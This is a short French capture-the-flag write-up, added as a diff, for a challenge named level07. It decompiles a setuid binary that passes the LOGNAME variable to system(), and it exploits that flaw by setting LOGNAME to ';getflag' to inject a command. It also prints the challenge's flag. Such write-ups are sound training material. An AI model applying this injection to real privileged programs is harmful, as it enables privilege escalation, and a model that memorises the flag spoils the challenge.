@@ -1,0 +1,37 @@
+avec ls on voit un executable qui se nomme level07
+on le recupere: scp -P 4243 level07@127.0.0.1:/home/user/level07/level07 .
+
+on l'ouvre avec ghidra et on obtiernt la fonction suivante:
+
+int main(int argc,char **argv,char **envp)
+
+{
+  char *pcVar1;
+  int iVar2;
+  char *buffer;
+  gid_t gid;
+  uid_t uid;
+  char *local_1c;
+  __gid_t local_18;
+  __uid_t local_14;
+  
+  local_18 = getegid();
+  local_14 = geteuid();
+  setresgid(local_18,local_18,local_18);
+  setresuid(local_14,local_14,local_14);
+  local_1c = (char *)0x0;
+  pcVar1 = getenv("LOGNAME");
+  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
+  iVar2 = system(local_1c);
+  return iVar2;
+}
+
+on remarque qu'il y a un getenv("LOGNAME") qui recupere la variable d'environnement LOGNAME
+puis on fait un asprintf dans local_1c de la commande /bin/echo avec la valeur de LOGNAME
+puis on execute la commande avec system(local_1c)
+
+ce qui veut dire qu'on peut executer une commande de notre choix en modifiant LOGNAME
+on fait donc:
+export LOGNAME=";getflag"
+et on execute ./level07
+on obtient le flag: fiumuikeil55xe9cu4dood66h
